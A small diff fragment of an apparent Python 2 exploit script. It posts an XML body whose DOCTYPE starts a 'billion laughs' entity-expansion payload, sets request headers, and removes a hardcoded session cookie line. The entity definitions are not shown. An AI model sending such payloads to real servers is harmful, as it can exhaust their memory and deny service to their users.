@@ -29,7 +29,6 @@ data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
 req = urllib2.Request(target,data)
 req.add_header('Accept', '*/*')
 req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
-req.add_header('Cookie', 'PHPSESSID=9fkioe7aso0qb7ojt9nc884c53; _gat=1; _ga=GA1.2.1621297442.1563395634; _gid=GA1.2.751627580.1566172493')
 req.add_header('Connection', '')
 req.add_header('Content-type', 'text/xml')
 
